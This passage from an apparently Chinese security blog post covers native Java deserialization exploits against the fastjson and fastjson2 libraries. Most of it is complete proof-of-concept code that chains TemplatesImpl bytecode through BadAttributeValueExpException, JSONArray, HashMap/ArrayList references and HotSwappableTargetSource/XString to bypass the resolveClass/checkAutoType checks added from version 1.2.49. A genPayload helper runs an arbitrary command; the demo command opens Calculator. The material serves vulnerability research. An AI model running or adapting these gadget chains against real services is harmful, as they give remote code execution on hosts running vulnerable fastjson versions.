class="keyword">void</span> <span class="title function_">setValue</span><span class="params">(Object obj, String name, Object value)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(name);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">clazz</span> <span class="operator">=</span> pool.makeClass(<span class="string">&quot;a&quot;</span>);</span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">superClass</span> <span class="operator">=</span> pool.get(AbstractTranslet.class.getName());</span><br><span class="line">        clazz.setSuperclass(superClass);</span><br><span class="line">        <span class="type">CtConstructor</span> <span class="variable">constructor</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">CtConstructor</span>(<span class="keyword">new</span> <span class="title class_">CtClass</span>[]&#123;&#125;, clazz);</span><br><span class="line">        constructor.setBody(<span class="string">&quot;Runtime.getRuntime().exec(\&quot;open -na Calculator\&quot;);&quot;</span>);</span><br><span class="line">        clazz.addConstructor(constructor);</span><br><span class="line">        <span class="type">byte</span>[][] bytes = <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;clazz.toBytecode()&#125;;</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> TemplatesImpl.class.newInstance();</span><br><span class="line">        setValue(templates, <span class="string">&quot;_bytecodes&quot;</span>, bytes);</span><br><span class="line">        setValue(templates, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;y4tacker&quot;</span>);</span><br><span class="line">        setValue(templates, <span class="string">&quot;_tfactory&quot;</span>, <span class="literal">null</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="type">JSONArray</span> <span class="variable">jsonArray</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JSONArray</span>();</span><br><span class="line">        jsonArray.add(templates);</span><br><span class="line"></span><br><span class="line">        <span class="type">BadAttributeValueExpException</span> <span class="variable">val</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BadAttributeValueExpException</span>(<span class="literal">null</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">valfield</span> <span class="operator">=</span> val.getClass().getDeclaredField(<span class="string">&quot;val&quot;</span>);</span><br><span class="line">        valfield.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        valfield.set(val, jsonArray);</span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">barr</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">objectOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(barr);</span><br><span class="line">        objectOutputStream.writeObject(val);</span><br><span class="line"></span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(barr.toByteArray()));</span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> (Object)ois.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>fastjson2</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> javax.management.BadAttributeValueExpException;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson2.JSONArray;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;</span><br><span class="line"><span class="keyword">import</span> javassist.CtConstructor;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setValue</span><span class="params">(Object obj, String name, Object value)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(name);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">clazz</span> <span class="operator">=</span> pool.makeClass(<span class="string">&quot;a&quot;</span>);</span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">superClass</span> <span class="operator">=</span> pool.get(AbstractTranslet.class.getName());</span><br><span class="line">        clazz.setSuperclass(superClass);</span><br><span class="line">        <span class="type">CtConstructor</span> <span class="variable">constructor</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">CtConstructor</span>(<span class="keyword">new</span> <span class="title class_">CtClass</span>[]&#123;&#125;, clazz);</span><br><span class="line">        constructor.setBody(<span class="string">&quot;Runtime.getRuntime().exec(\&quot;open -na Calculator\&quot;);&quot;</span>);</span><br><span class="line">        clazz.addConstructor(constructor);</span><br><span class="line">        <span class="type">byte</span>[][] bytes = <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;clazz.toBytecode()&#125;;</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> TemplatesImpl.class.newInstance();</span><br><span class="line">        setValue(templates, <span class="string">&quot;_bytecodes&quot;</span>, bytes);</span><br><span class="line">        setValue(templates, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;y4tacker&quot;</span>);</span><br><span class="line">        setValue(templates, <span class="string">&quot;_tfactory&quot;</span>, <span class="literal">null</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="type">JSONArray</span> <span class="variable">jsonArray</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JSONArray</span>();</span><br><span class="line">        jsonArray.add(templates);</span><br><span class="line"></span><br><span class="line">        <span class="type">BadAttributeValueExpException</span> <span class="variable">val</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BadAttributeValueExpException</span>(<span class="literal">null</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">valfield</span> <span class="operator">=</span> val.getClass().getDeclaredField(<span class="string">&quot;val&quot;</span>);</span><br><span class="line">        valfield.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        valfield.set(val, jsonArray);</span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">barr</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">objectOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(barr);</span><br><span class="line">        objectOutputStream.writeObject(val);</span><br><span class="line"></span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(barr.toByteArray()));</span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> (Object)ois.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="fastjson原生反序列化1-2-49绕过">fastjson原生反序列化1.2.49绕过</h2><p>从1.2.49开始，我们的JSONArray以及JSONObject方法开始真正有了自己的readObject方法</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1733917133612-8a27bbe1-a04e-4023-8195-fab843ad3704.png" alt=""></p><p>在其<code>SecureObjectInputStream</code>类当中重写了<code>resolveClass</code>,在其中调用了<code>checkAutoType</code>方法做类的检查</p><p>具体调用流程参考：y4师傅的博客：</p><p><a href="https://y4tacker.github.io/2023/04/26/year/2023/4/FastJson%E4%B8%8E%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-%E4%BA%8C/#%E5%9B%9E%E9%A1%BE">https://y4tacker.github.io/2023/04/26/year/2023/4/FastJson%E4%B8%8E%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-%E4%BA%8C/#%E5%9B%9E%E9%A1%BE</a></p><h3 id="绕过">绕过:</h3><ul><li>所以我们的重点就是如何在JSONArray/JSONObject对象反序列化恢复对象时，让我们的恶意类成为引用类型从而绕过resolveClass的检查</li><li>当向List、set、map类型中添加同样对象时即可成功利用，当我们写入对象时，会在<code>handles</code>这个哈希表中建立从对象到引用的映射,当再次写入同一对象时，在<code>handles</code>这个hash表中查到了映射，那么就会通过<code>writeHandle</code>将重复对象以引用类型写入</li></ul><p>y4师傅的流程总结</p><p>序列化时，在这里templates先加入到arrayList中，后面在JSONArray中再次序列化TemplatesImpl时，由于在<code>handles</code>这个hash表中查到了映射，后续则会以引用形式输出</p><p>反序列化时ArrayList先通过readObject恢复TemplatesImpl对象，之后恢复BadAttributeValueExpException对象，在恢复过程中，由于BadAttributeValueExpException要恢复val对应的JSONArray/JSONObject对象，会触发JSONArray/JSONObject的readObject方法，将这个过程委托给<code>SecureObjectInputStream</code>，在恢复JSONArray/JSONObject中的TemplatesImpl对象时，由于此时的第二个TemplatesImpl对象是引用类型，通过readHandle恢复对象的途中不会触发resolveClass，由此实现了绕过</p><p>当然前面也提到了不仅仅是List，Set与Map类型都能成功触发引用绕过。</p><h3 id="POC">POC</h3><p>maven</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;dependency&gt;</span><br><span class="line">    &lt;groupId&gt;com.alibaba&lt;/groupId&gt;</span><br><span class="line">    &lt;artifactId&gt;fastjson&lt;/artifactId&gt;</span><br><span class="line">    &lt;version&gt;<span class="number">1.2</span><span class="number">.83</span>&lt;/version&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br><span class="line">&lt;dependency&gt;</span><br><span class="line">    &lt;groupId&gt;org.javassist&lt;/groupId&gt;</span><br><span class="line">    &lt;artifactId&gt;javassist&lt;/artifactId&gt;</span><br><span class="line">    &lt;version&gt;<span class="number">3.27</span><span class="number">.0</span>-GA&lt;/version&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>hashmap引用</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSONArray;</span><br><span class="line"><span class="keyword">import</span> javax.management.BadAttributeValueExpException;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;</span><br><span class="line"><span class="keyword">import</span> javassist.CtConstructor;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Y4HackJSON</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setValue</span><span class="params">(Object obj, String name, Object value)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(name);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">byte</span>[] genPayload(String cmd) <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">clazz</span> <span class="operator">=</span> pool.makeClass(<span class="string">&quot;a&quot;</span>);</span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">superClass</span> <span class="operator">=</span> pool.get(AbstractTranslet.class.getName());</span><br><span class="line">        clazz.setSuperclass(superClass);</span><br><span class="line">        <span class="type">CtConstructor</span> <span class="variable">constructor</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">CtConstructor</span>(<span class="keyword">new</span> <span class="title class_">CtClass</span>[]&#123;&#125;, clazz);</span><br><span class="line">        constructor.setBody(<span class="string">&quot;Runtime.getRuntime().exec(\&quot;&quot;</span>+cmd+<span class="string">&quot;\&quot;);&quot;</span>);</span><br><span class="line">        clazz.addConstructor(constructor);</span><br><span class="line">        clazz.getClassFile().setMajorVersion(<span class="number">49</span>);</span><br><span class="line">        <span class="keyword">return</span> clazz.toBytecode();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> TemplatesImpl.class.newInstance();</span><br><span class="line">        setValue(templates, <span class="string">&quot;_bytecodes&quot;</span>, <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;genPayload(<span class="string">&quot;open -na Calculator&quot;</span>)&#125;);</span><br><span class="line">        setValue(templates, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;1&quot;</span>);</span><br><span class="line">        setValue(templates, <span class="string">&quot;_tfactory&quot;</span>, <span class="literal">null</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">JSONArray</span> <span class="variable">jsonArray</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JSONArray</span>();</span><br><span class="line">        jsonArray.add(templates);</span><br><span class="line"></span><br><span class="line">        <span class="type">BadAttributeValueExpException</span> <span class="variable">bd</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BadAttributeValueExpException</span>(<span class="literal">null</span>);</span><br><span class="line">        setValue(bd,<span class="string">&quot;val&quot;</span>,jsonArray);</span><br><span class="line"></span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">hashMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        hashMap.put(templates,bd);</span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">byteArrayOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">objectOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(byteArrayOutputStream);</span><br><span class="line">        objectOutputStream.writeObject(hashMap);</span><br><span class="line">        objectOutputStream.close();</span><br><span class="line"></span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">objectInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(byteArrayOutputStream.toByteArray()));</span><br><span class="line">        objectInputStream.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>arraylist引用</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.ocean;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSONArray;</span><br><span class="line"><span class="keyword">import</span> javax.management.BadAttributeValueExpException;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.ArrayList;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;</span><br><span class="line"><span class="keyword">import</span> javassist.CtConstructor;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">fastjsonyuanshengBypass</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setValue</span><span class="params">(Object obj, String name, Object value)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(name);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">byte</span>[] genPayload(String cmd) <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">clazz</span> <span class="operator">=</span> pool.makeClass(<span class="string">&quot;a&quot;</span>);</span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">superClass</span> <span class="operator">=</span> pool.get(AbstractTranslet.class.getName());</span><br><span class="line">        clazz.setSuperclass(superClass);</span><br><span class="line">        <span class="type">CtConstructor</span> <span class="variable">constructor</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">CtConstructor</span>(<span class="keyword">new</span> <span class="title class_">CtClass</span>[]&#123;&#125;, clazz);</span><br><span class="line">        constructor.setBody(<span class="string">&quot;Runtime.getRuntime().exec(\&quot;&quot;</span>+cmd+<span class="string">&quot;\&quot;);&quot;</span>);</span><br><span class="line">        clazz.addConstructor(constructor);</span><br><span class="line">        clazz.getClassFile().setMajorVersion(<span class="number">49</span>);</span><br><span class="line">        <span class="keyword">return</span> clazz.toBytecode();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> TemplatesImpl.class.newInstance();</span><br><span class="line">        setValue(templates, <span class="string">&quot;_bytecodes&quot;</span>, <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;genPayload(<span class="string">&quot;open -na Calculator&quot;</span>)&#125;);</span><br><span class="line">        setValue(templates, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;1&quot;</span>);</span><br><span class="line">        setValue(templates, <span class="string">&quot;_tfactory&quot;</span>, <span class="literal">null</span>);</span><br><span class="line">        ArrayList&lt;Object&gt; arrayList = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">        arrayList.add(templates);</span><br><span class="line">        <span class="type">JSONArray</span> <span class="variable">jsonArray</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JSONArray</span>();</span><br><span class="line">        jsonArray.add(templates);</span><br><span class="line"></span><br><span class="line">        <span class="type">BadAttributeValueExpException</span> <span class="variable">bd</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BadAttributeValueExpException</span>(<span class="literal">null</span>);</span><br><span class="line">        setValue(bd,<span class="string">&quot;val&quot;</span>,jsonArray);</span><br><span class="line">        arrayList.add(bd);</span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">byteArrayOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">objectOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(byteArrayOutputStream);</span><br><span class="line">        objectOutputStream.writeObject(arrayList);</span><br><span class="line">        objectOutputStream.close();</span><br><span class="line"></span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">objectInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(byteArrayOutputStream.toByteArray()));</span><br><span class="line">        objectInputStream.readObject();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="Fastjson-Xstring绕过-HotSwappableTargetSource">Fastjson Xstring绕过-HotSwappableTargetSource</h2><p>在一些ctf题目中会将BadAttributeValueExpException给禁用掉所以这里学习到一种新的绕过链子先给出poc</p><h3 id="POC-2">POC</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.ocean;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSONObject;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xpath.internal.objects.XString;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassClassPath;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;</span><br><span class="line"><span class="keyword">import</span> org.springframework.aop.target.HotSwappableTargetSource;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">fastjsonyuanshengBypass_xstring</span> &#123;</span><br><span class="line">    <span 